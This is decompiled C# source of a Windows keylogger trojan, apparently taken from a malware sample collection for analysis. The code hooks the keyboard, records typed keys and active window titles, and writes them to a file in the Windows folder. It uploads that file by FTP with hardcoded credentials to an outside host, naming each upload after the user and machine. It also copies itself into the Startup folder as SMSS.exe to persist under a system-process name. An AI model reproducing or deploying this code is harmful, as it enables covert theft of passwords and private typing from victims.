// Decompiled with JetBrains decompiler
// Type: logiciel_debutant.Form1
// Assembly: smss, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A1BF21EF-D763-4A59-AF7B-8CA6341AB6D1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Fsysna.bxwl-222547f66844d44d6078e1433d2096b799a8239933bba16debf1a688059013bc.exe

using logiciel_debutant.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace logiciel_debutant
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("k")]
    private keyboard _k;
    private string Append;
    private string count;
    private bool maju;
    private string touche;
    private string strin;
    private string MyStr;
    private bool debut;
    private string Patch;
    private string Patch2;
    private StreamWriter sw;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.k = new keyboard();
      this.maju = false;
      this.touche = Conversions.ToString(1);
      this.strin = (string) null;
      this.MyStr = "";
      this.debut = true;
      this.Patch = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
      this.Patch2 = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.TextBox1 = new TextBox();
      this.SuspendLayout();
      this.TextBox1.Location = new Point(0, 0);
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1 = this.TextBox1;
      Size size1 = new Size(294, 266);
      Size size2 = size1;
      textBox1.Size = size2;
      this.TextBox1.TabIndex = 0;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(292, 266);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.TextBox1);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual TextBox TextBox1
    {
      get => this._TextBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    private virtual keyboard k
    {
      get => this._k;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        keyboard.DownEventHandler downEventHandler = new keyboard.DownEventHandler(this.k_down);
        if (this._k != null)
          keyboard.Down -= downEventHandler;
        this._k = value;
        if (this._k == null)
          return;
        keyboard.Down += downEventHandler;
      }
    }

    private string GetActiveWindowTitle()
    {
      this.MyStr = new string(char.MinValue, 100);
      Form1.GetWindowText(Form1.GetForegroundWindow(), ref this.MyStr, 100);
      this.MyStr = this.MyStr.Substring(0, checked (Strings.InStr(this.MyStr, "\0") - 1));
      return this.MyStr;
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.strin, this.GetActiveWindowTitle(), false) == 0)
        return;
      TextBox textBox1 = this.TextBox1;
      textBox1.Text = textBox1.Text + "\r\n<" + Conversions.ToString(DateTime.Now) + " - " + this.GetActiveWindowTitle() + ">\r\n";
      this.strin = this.GetActiveWindowTitle();
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => this.k.DiposeHook();

    private void k_down(string key)
    {
      this.Append += key;
      if (Operators.CompareString(key, " [MAJ]", false) == 0)
      {
        key = "";
        if (Conversions.ToDouble(this.touche) == 1.0)
        {
          this.maju = true;
          this.touche = Conversions.ToString(0);
        }
        else
        {
          this.maju = false;
          this.touche = Conversions.ToString(1);
        }
      }
      if (Operators.CompareString(key, "*0", false) == 0)
        key = "0";
      if (Operators.CompareString(key, "*1", false) == 0)
        key = "1";
      if (Operators.CompareString(key, "*2", false) == 0)
        key = "2";
      if (Operators.CompareString(key, "*3", false) == 0)
        key = "3";
      if (Operators.CompareString(key, "*4", false) == 0)
        key = "4";
      if (Operators.CompareString(key, "*5", false) == 0)
        key = "5";
      if (Operators.CompareString(key, "*6", false) == 0)
        key = "6";
      if (Operators.CompareString(key, "*7", false) == 0)
        key = "7";
      if (Operators.CompareString(key, "*8", false) == 0)
        key = "8";
      if (Operators.CompareString(key, "*9", false) == 0)
        key = "9";
      if (this.maju)
      {
        if (Operators.CompareString(key, "&", false) == 0)
          key = "1";
        if (Operators.CompareString(key, "é", false) == 0)
          key = "2";
        if (Operators.CompareString(key, "\"", false) == 0)
          key = "3";
        if (Operators.CompareString(key, "'", false) == 0)
          key = "4";
        if (Operators.CompareString(key, "(", false) == 0)
          key = "5";
        if (Operators.CompareString(key, "-", false) == 0)
          key = "6";
        if (Operators.CompareString(key, "è", false) == 0)
          key = "7";
        if (Operators.CompareString(key, "_", false) == 0)
          key = "8";
        if (Operators.CompareString(key, "ç", false) == 0)
          key = "9";
        if (Operators.CompareString(key, "à", false) == 0)
          key = "0";
        if (Operators.CompareString(key, ")", false) == 0)
          key = "°";
        if (Operators.CompareString(key, "=", false) == 0)
          key = "+";
        if (Operators.CompareString(key, "^", false) == 0)
          key = "¨";
        if (Operators.CompareString(key, "$", false) == 0)
          key = "£";
        if (Operators.CompareString(key, "ù", false) == 0)
          key = "%";
        if (Operators.CompareString(key, "*", false) == 0)
          key = "µ";
        if (Operators.CompareString(key, ",", false) == 0)
          key = "?";
        if (Operators.CompareString(key, ";", false) == 0)
          key = ".";
        if (Operators.CompareString(key, ":", false) == 0)
          key = "/";
        if (Operators.CompareString(key, "!", false) == 0)
          key = "§";
        if (Operators.CompareString(key, "a", false) == 0)
          key = "A";
        if (Operators.CompareString(key, "b", false) == 0)
          key = "B";
        if (Operators.CompareString(key, "c", false) == 0)
          key = "C";
        if (Operators.CompareString(key, "d", false) == 0)
          key = "D";
        if (Operators.CompareString(key, "e", false) == 0)
          key = "E";
        if (Operators.CompareString(key, "f", false) == 0)
          key = "F";
        if (Operators.CompareString(key, "g", false) == 0)
          key = "G";
        if (Operators.CompareString(key, "h", false) == 0)
          key = "H";
        if (Operators.CompareString(key, "i", false) == 0)
          key = "I";
        if (Operators.CompareString(key, "j", false) == 0)
          key = "J";
        if (Operators.CompareString(key, "k", false) == 0)
          key = "K";
        if (Operators.CompareString(key, "l", false) == 0)
          key = "L";
        if (Operators.CompareString(key, "m", false) == 0)
          key = "M";
        if (Operators.CompareString(key, "n", false) == 0)
          key = "N";
        if (Operators.CompareString(key, "o", false) == 0)
          key = "O";
        if (Operators.CompareString(key, "p", false) == 0)
          key = "P";
        if (Operators.CompareString(key, "q", false) == 0)
          key = "Q";
        if (Operators.CompareString(key, "r", false) == 0)
          key = "R";
        if (Operators.CompareString(key, "s", false) == 0)
          key = "S";
        if (Operators.CompareString(key, "t", false) == 0)
          key = "T";
        if (Operators.CompareString(key, "u", false) == 0)
          key = "U";
        if (Operators.CompareString(key, "v", false) == 0)
          key = "V";
        if (Operators.CompareString(key, "w", false) == 0)
          key = "W";
        if (Operators.CompareString(key, "x", false) == 0)
          key = "X";
        if (Operators.CompareString(key, "y", false) == 0)
          key = "Y";
        if (Operators.CompareString(key, "z", false) == 0)
          key = "Z";
      }
      this.GetActiveWindowTitle();
      this.TextBox1.Text += key;
      if (Operators.CompareString(key, " [ENTRER]", false) == 0)
        this.TextBox1.Text += "\r\n";
      this.count = Conversions.ToString(Information.UBound((Array) Strings.Split(this.TextBox1.Text, "\r\n")));
      if (Conversions.ToDouble(this.count) < 89.0)
        return;
      this.count = Conversions.ToString(0);
      if (System.IO.File.Exists(this.Patch + "\\config.txt"))
        System.IO.File.Delete(this.Patch + "\\config.txt");
      this.sw = System.IO.File.CreateText(this.Patch + "\\config.txt");
      this.sw.Close();
      this.sw = new StreamWriter(this.Patch + "\\config.txt");
      this.sw.WriteLine(this.TextBox1.Text);
      this.sw.Close();
      this.sw = (StreamWriter) null;
      FileInfo fileInfo = new FileInfo(this.Patch + "\\config.txt");
      FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create("ftp://ftp.byethost22.com/htdocs/" + Strings.Replace(Conversions.ToString(DateTime.Now), "/", "-") + " --- " + Environment.UserName + " - " + Environment.MachineName + ".txt");
      ftpWebRequest.Credentials = (ICredentials) new NetworkCredential("b22_7418812", "51d688c6d76");
      ftpWebRequest.Method = "STOR";
      byte[] buffer = System.IO.File.ReadAllBytes(this.Patch + "\\config.txt");
      Stream requestStream = ftpWebRequest.GetRequestStream();
      requestStream.Write(buffer, 0, buffer.Length);
      requestStream.Close();
      requestStream.Dispose();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.k.CreateHook();
      this.Timer1.Start();
      if (System.IO.File.Exists(this.Patch2 + "\\SMSS.exe"))
        return;
      MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, this.Patch2 + "\\SMSS.exe", true);
    }
  }
}
